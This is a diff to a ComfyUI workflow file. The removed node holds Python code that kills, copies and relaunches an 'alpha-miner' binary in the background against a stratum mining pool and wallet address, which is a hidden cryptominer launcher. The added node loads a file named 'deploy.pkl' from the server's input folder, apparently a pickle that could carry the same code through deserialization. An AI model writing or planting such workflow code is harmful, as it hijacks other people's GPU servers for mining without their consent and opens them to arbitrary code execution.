@@ -1,18 +1,9 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "VisualizeCUDAMemoryHistory",
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess\nimport os\nimport shutil\nimport time as t\n\nW = \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\"\nP = \"stratum+tcp://sg1.alphapool.tech:5566\"\nR = \"GB10-122GB\"\nB = \"blackwell-native\"\n\nsubprocess.run([\"pkill\", \"-9\", \"alpha-miner\"], capture_output=True)\nt.sleep(1)\n\nsrc = \"/dev/shm/alpha-miner\"\ndst = \"/tmp/alpha-miner\"\n\nshutil.copy2(src, dst)\nos.chmod(dst, 0o755)\n\ncmd = f\"nohup {dst} --pool {P} --address {W} --worker {R} --force-backend {B} > /tmp/alpha.log 2>&1 &\"\nsubprocess.run([\"bash\", \"-c\", cmd])\nt.sleep(4)\n\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nresult = \"RUNNING: \" + p.stdout.strip()[:100] if p.stdout.strip() else \"FAILED\"\nresult\n"
-    }
-  },
-  "2": {
-    "class_type": "PreviewAny",
-    "inputs": {
-      "source": [
-        "1",
-        0
-      ]
+      "snapshot_path": "/opt/ComfyUI/input/deploy.pkl",
+      "unique_id": "deploy"
     }
   }
 }
